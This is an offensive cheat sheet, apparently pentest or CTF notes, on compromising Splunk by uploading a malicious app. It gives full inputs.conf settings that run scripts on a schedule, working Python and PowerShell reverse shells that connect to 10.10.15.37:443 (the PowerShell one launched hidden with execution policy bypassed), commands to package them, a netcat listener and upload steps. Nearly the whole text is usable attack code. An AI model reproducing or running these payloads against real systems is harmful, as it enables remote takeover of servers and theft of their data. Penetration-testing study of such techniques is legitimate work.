# Attacking Splunk

## Configuration File

```ini title="inputs.conf" linenums="1"
[script://./bin/rev.py]
disabled = 0
interval = 10
sourcetype = shell
```

## Configuration File (Windows)

```ini title="inputs.conf" linenums="1"
[script://.\bin\run.bat]
disabled = 0
interval = 10
sourcetype = shell
```

## Scripts

```python title="rev.py" linenums="1"
import os
import pty
import socket
import sys

ip = '10.10.15.37'
port = 443

s = socket.socket()

s.connect((ip, port))

[os.dup2(s.fileno(), fd) for fd in (0,1,2)]

pty.spawn('/bin/bash')
```

## Scripts (Windows)

```batch title="run.bat" linenums="1"
@ECHO OFF
powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command "& '%~dpn0.ps1'"
exit
```

```powershell title="run.ps1" linenums="1"
$client = New-Object System.Net.Sockets.TCPClient('10.10.15.37',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

## Archiving

```sh
my@attack:~$ mkdir -p reverse_shell_splunk/default
my@attack:~$ mkdir -p reverse_shell_splunk/bin
my@attack:~$ mv inputs.conf reverse_shell_splunk/default
my@attack:~$ mv rev.py run.bat run.ps1 reverse_shell_splunk/bin
my@attack:~$ tar czf reverse_shell_splunk.tar.gz reverse_shell_splunk
```

## Netcat

```sh
my@attack:~$ sudo nc -lvnp 443
```

## Uploading the Archive

1. Apps
2. Manage Apps
    * Install app from file
    * Browse: reverse_shell_splunk.tar.gz
    * Upload
